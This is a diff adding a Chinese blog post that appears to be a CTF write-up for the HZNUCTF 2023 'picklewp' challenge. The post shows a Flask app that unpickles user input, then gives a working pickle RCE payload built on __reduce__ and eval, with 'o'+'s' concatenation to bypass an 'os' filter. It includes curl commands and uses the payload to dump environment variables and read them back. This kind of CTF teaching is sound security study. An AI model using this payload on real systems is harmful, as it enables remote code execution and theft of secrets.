@@ -3514,6 +3514,196 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-17 18:10:00+00:00">2026-11-17</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../python/" class="md-meta__link">Python</a>, 
+              <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
+              <a href="./" class="md-meta__link">代码审计</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="hznuctf-2023-preliminary-picklewp"><a class="toclink" href="../../hznuctf2023-picklewp/">[HZNUCTF 2023 preliminary] picklewp — 把命令结果写到文件，再换个名字读回来</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Python 反序列化（pickle RCE）+ 关键词过滤绕过</p>
+<p><strong>Flag</strong>：<code>NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../hznuctf2023-picklewp/#_1">题目概述</a></h3>
+<p>进靶场直接给源码。<strong>先把缩进换行整理一遍再读</strong>——粘出来格式全乱了，<code>Shift+Alt+F</code> 走一下。</p>
+<p>源码一共二十行，三个路由。</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../hznuctf2023-picklewp/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../hznuctf2023-picklewp/#step-1">Step 1：读源码，两个点连起来看</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'app.py'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>        <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>
+</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/calc'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
+</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a><span class="k">def</span><span class="w"> </span><span class="nf">getflag</span><span class="p">():</span>
+</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a>    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"payload"</span><span class="p">)</span>
+</span><span id="__span-60-9"><a id="__codelineno-60-9" name="__codelineno-60-9" href="#__codelineno-60-9"></a>    <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'os'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">''</span><span class="p">))</span>
+</span><span id="__span-60-10"><a id="__codelineno-60-10" name="__codelineno-60-10" href="#__codelineno-60-10"></a>    <span class="k">return</span> <span class="s2">"ganbadie!"</span>
+</span><span id="__span-60-11"><a id="__codelineno-60-11" name="__codelineno-60-11" href="#__codelineno-60-11"></a>
+</span><span id="__span-60-12"><a id="__codelineno-60-12" name="__codelineno-60-12" href="#__codelineno-60-12"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/readFile'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
+</span><span id="__span-60-13"><a id="__codelineno-60-13" name="__codelineno-60-13" href="#__codelineno-60-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">readFile</span><span class="p">():</span>
+</span><span id="__span-60-14"><a id="__codelineno-60-14" name="__codelineno-60-14" href="#__codelineno-60-14"></a>    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'filename'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"flag"</span><span class="p">,</span> <span class="s2">"?????"</span><span class="p">)</span>
+</span><span id="__span-60-15"><a id="__codelineno-60-15" name="__codelineno-60-15" href="#__codelineno-60-15"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-60-16"><a id="__codelineno-60-16" name="__codelineno-60-16" href="#__codelineno-60-16"></a>        <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></code></pre></div>
+<p><strong>三个路由各司其职：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>/          直接把源码吐出来（等于免费给源码）
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>/calc      base64 解码 → pickle.loads → 反序列化执行
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>/readFile  读任意文件，但文件名里的 "flag" 会被替换成 "?????"
+</span></code></pre></div>
+<p><strong>所以这题的结构是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>/calc 负责执行命令（把结果写到文件里）
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>/readFile 负责把文件读出来（但文件名不能带 flag）
+</span></code></pre></div>
+<p><strong>两个点必须连起来用——一个没有回显，另一个不能读带 flag 名字的文件。</strong></p>
+<h4 id="step-2calc"><a class="toclink" href="../../hznuctf2023-picklewp/#step-2calc">Step 2：<code>/calc</code> 的过滤怎么绕</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'os'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">''</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>注意执行顺序：先 base64 解码，</strong>再<strong>对解码出来的字节做 <code>os</code> 替换。</strong></p>
+<p><strong>所以只要 payload 里出现连续的 <code>os</code>，就会被删掉——<code>pickle.loads</code> 直接炸。</strong></p>
+<p><strong>绕过方式：字符串拼接。</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="s1">'__import__("o" + "s").system("id")'</span>
+</span></code></pre></div>
+<p><strong>在 pickle 的字节流里，<code>o</code> 和 <code>s</code> 是两个独立的字符，不会形成连续的 <code>os</code>；到运行时它们才拼成 <code>os</code>。</strong></p>
+<p><strong>这是“过滤字符但是执行时拼接”的通用思路。</strong></p>
+<h4 id="step-3-pickle-payload"><a class="toclink" href="../../hznuctf2023-picklewp/#step-3-pickle-payload">Step 3：构造 pickle payload</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="k">class</span><span class="w"> </span><span class="nc">evil</span><span class="p">:</span>
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>        <span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">"__import__('o'+'s').system('env &gt; x.txt')"</span><span class="p">,))</span>
+</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>
+</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a><span class="n">new</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">evil</span><span class="p">(),</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a><span class="nb">print</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>三个要点：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>① __reduce__：反序列化时返回 (可调用对象, 参数) → 服务器执行 eval(...)
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>② 'o'+'s' 拼接：避开 replace(b'os', b'')
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>③ urllib.parse.quote：base64 里的 + 必须做 URL 编码
+</span></code></pre></div>
+<h4 id="step-4"><a class="toclink" href="../../hznuctf2023-picklewp/#step-4">Step 4：为什么 <code>+</code> 必须编码（这题卡最久的地方）</a></h4>
+<p><strong>base64 的字符集里包含 <code>+</code>，而 <code>+</code> 放在 URL 的 query 里会被解码成</strong>空格<strong>。</strong></p>
+<p><strong>于是你发出去的是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>/calc?payload=gAN9cQAo...ab+cd...
+</span></code></pre></div>
+<p><strong>服务器收到的 <code>payload</code> 已经变成：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>gAN9cQAo...ab cd...
+</span></code></pre></div>
+<p><strong>中间多了一个空格，base64 解码直接失败——而 <code>/calc</code> 成功时只返回 <code>ganbadie!</code>，失败时也没有明显报错，</strong>看起来就像“没反应”<strong>。</strong></p>
+<p><strong>所以脚本最后一定要 <code>quote()</code>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>+  →  %2B
+</span></code></pre></div>
+<p><strong>这也是为什么用 <code>curl -G --data-urlencode</code> 更省事——它替你编码。</strong></p>
+<h4 id="step-5flag"><a class="toclink" href="../../hznuctf2023-picklewp/#step-5flag">Step 5：第一次读到的“flag”是假的</a></h4>
+<p><strong>先 <code>cat /f*</code>，写进 <code>x.txt</code>，再用 <code>/readFile?filename=./x.txt</code> 读回来：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>flagnothere
+</span></code></pre></div>
+<p><strong>是个干扰文件。</strong></p>
+<p><strong>接着 <code>ls /</code>，根目录下只有一个 <code>flag.sh</code>——读出来也不是真的。</strong></p>
+<p><strong>那就换方向：看环境变量。</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="s2">"__import__('o'+'s').system('env &gt; x.txt')"</span>
+</span></code></pre></div>
+<p><strong><code>/readFile?filename=./x.txt</code> 读回来，flag 在环境变量里：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/calc</code></td>
+<td><code>pickle.loads(b64decode(payload))</code> → 反序列化即执行</td>
+</tr>
+<tr>
+<td>过滤</td>
+<td><code>.replace(b'os', b'')</code> 作用在<strong>解码后的字节</strong>上</td>
+</tr>
+<tr>
+<td>绕过</td>
+<td><code>'o' + 's'</code> 拼接，字节流里不出现连续 <code>os</code></td>
+</tr>
+<tr>
+<td><code>/readFile</code></td>
+<td>文件名里的 <code>flag</code> 会被替换成 <code>?????</code> → 必须换个名字写</td>
+</tr>
+<tr>
+<td>读写配合</td>
+<td><code>/calc</code> 写文件、<code>/readFile</code> 读回来（无回显题的常规套路）</td>
+</tr>
+<tr>
+<td><code>+</code> 的坑</td>
+<td>base64 的 <code>+</code> 在 query 里会被当空格，必须 <code>quote()</code></td>
+</tr>
+<tr>
+<td>假 flag</td>
+<td><code>flagnothere</code>、<code>/flag.sh</code> 都是干扰，真正的在环境变量</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整 payload</summary>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
+</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a>
+</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a><span class="k">class</span><span class="w"> </span><span class="nc">evil</span><span class="p">:</span>
+</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a>        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">"__import__('o'+'s').system('env &gt; x.txt')"</span><span class="p">,))</span>
+</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a>
+</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a><span class="n">new</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">evil</span><span class="p">(),</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span><span id="__span-73-10"><a id="__codelineno-73-10" name="__codelineno-73-10" href="#__codelineno-73-10"></a><span class="nb">print</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">))</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-G</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"payload=gAN9cQAo...（上面输出的结果）"</span> <span class="s2">"http://目标/calc"</span>
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-G</span> <span class="p">-</span><span class="n">-data-urlencode</span> <span class="s2">"filename=./x.txt"</span> <span class="s2">"http://目标/readFile"</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① <code>__import__['o'+'s']</code> 写成了下标</strong></p>
+<p>那是<strong>函数调用</strong>不是取下标，必须写 <code>__import__('o'+'s')</code>。写成方括号，eval 直接抛 TypeError，而 <code>/calc</code> 失败时页面没反馈，很难察觉。</p>
+<p><strong>② base64 的 <code>+</code> 没编码</strong></p>
+<p>query 里的 <code>+</code> → 空格 → base64 解码失败。<strong>表现是“页面没反应”，不是报错。</strong>这是这题最容易卡住的地方。</p>
+<p><strong>③ 想直接 <code>/readFile?filename=/flag</code></strong></p>
+<p>源码里 <code>filename.replace("flag", "?????")</code>——<strong>连路径里的 flag 都会被替换</strong>。所以必须先把内容写到另一个名字的文件里（<code>x.txt</code>），再读那个文件。</p>
+<p><strong>④ 只在根目录找 flag</strong></p>
+<p><code>cat /f*</code> 出来 <code>flagnothere</code>、<code>ls /</code> 只有一个 <code>flag.sh</code>。<strong>真 flag 在环境变量里（<code>env</code>）。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-17 17:00:00+00:00">2026-11-17</time></li>
         
           <li class="md-meta__item">
